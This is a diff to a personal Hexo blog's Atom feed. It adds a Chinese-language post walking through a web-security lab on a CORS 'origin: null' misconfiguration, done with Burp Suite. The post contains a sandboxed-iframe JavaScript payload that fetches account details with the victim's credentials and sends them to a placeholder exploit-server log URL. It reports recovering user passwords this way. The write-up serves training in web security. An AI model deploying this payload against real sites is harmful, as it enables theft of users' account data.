@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://yoursite.com/"/>
-  <updated>2019-12-04T06:08:26.942Z</updated>
+  <updated>2019-12-04T06:21:45.789Z</updated>
   <id>http://yoursite.com/</id>
   
   <author>
@@ -15,6 +15,32 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>CORS</title>
+    <link href="http://yoursite.com/2019/12/04/CORS/"/>
+    <id>http://yoursite.com/2019/12/04/CORS/</id>
+    <published>2019-12-04T06:20:20.000Z</published>
+    <updated>2019-12-04T06:21:45.789Z</updated>
+    
+    <content type="html"><![CDATA[<h3 id="关于Burp-Suite-的CORS-origin-null-的渗透"><a href="#关于Burp-Suite-的CORS-origin-null-的渗透" class="headerlink" title="关于Burp Suite 的CORS   origin:null 的渗透"></a>关于Burp Suite 的CORS   origin:null 的渗透</h3><p><strong>1.实验 登录你的账号密码</strong><br><img src="en-resource://database/6040:1" alt="ab391dd7015c2da12e84799da11985bb.png"><br><strong>2.用Burp Suite 拦截请求报文</strong><br><img src="en-resource://database/6042:1" alt="b1563c3125c4a6057201f51d5c5bf447.png"><br><strong>3.使用  漏洞利用服务器  并替换实验的URL</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line">&lt;iframe sandbox&#x3D;&quot;allow-scripts allow-top-navigation allow-forms&quot; src&#x3D;&quot;data:text&#x2F;html, &lt;script&gt;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line">var req &#x3D; new XMLHttpRequest ();</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line">req.onload &#x3D; reqListener;   req.open(&#39;get&#39;,&#39;$url&#x2F;accountDetails&#39;,true);</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">req.withCredentials &#x3D; true;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line">req.send();</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line">function reqListener()</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">7</span></pre></td><td class="code"><pre><span class="line">&#123;       </span></pre></td></tr><tr><td class="gutter"><pre><span class="line">8</span></pre></td><td class="code"><pre><span class="line">location&#x3D;&#39;$exploit-server-url&#x2F;log?key&#x3D;&#39;+encodeURIComponent(this.responseText);   </span></pre></td></tr><tr><td class="gutter"><pre><span class="line">9</span></pre></td><td class="code"><pre><span class="line">&#125;;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">10</span></pre></td><td class="code"><pre><span class="line">&lt;&#x2F;script&gt;&quot;&gt;&lt;&#x2F;iframe&gt;</span></pre></td></tr></table></figure><br><strong>4.进行测试</strong></p><p>用您的特定实验室的URL 替换$ url，用漏洞利用服务器的URL 替换$ exploit-server-url，然后单击“查看漏洞”对其进行测试</p><p><img src="en-resource://database/6044:1" alt="538a842cac20cf877357ff83652638a1.png"><br>看见日志  进行分析<br>发现了<br>wiener的APT密码</p><p>administrator的APT密码</p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;h3 id=&quot;关于Burp-Suite-的CORS-origin-null-的渗透&quot;&gt;&lt;a href=&quot;#关于Burp-Suite-的CORS-origin-null-的渗透&quot; class=&quot;headerlink&quot; title=&quot;关于Burp Suite 的CORS   ori
+      
+    
+    </summary>
+    
+    
+      <category term="渗透" scheme="http://yoursite.com/categories/%E6%B8%97%E9%80%8F/"/>
+    
+    
+      <category term="burp" scheme="http://yoursite.com/tags/burp/"/>
+    
+  </entry>
   
   <entry>
     <title>hello-world</title>
@@ -53,9 +79,9 @@
       <category term="吃饭" scheme="http://yoursite.com/categories/%E5%90%83%E9%A5%AD/"/>
     
     
-      <category term="渗透" scheme="http://yoursite.com/tags/%E6%B8%97%E9%80%8F/"/>
-    
       <category term="burp" scheme="http://yoursite.com/tags/burp/"/>
+    
+      <category term="渗透" scheme="http://yoursite.com/tags/%E6%B8%97%E9%80%8F/"/>
     
   </entry>
   
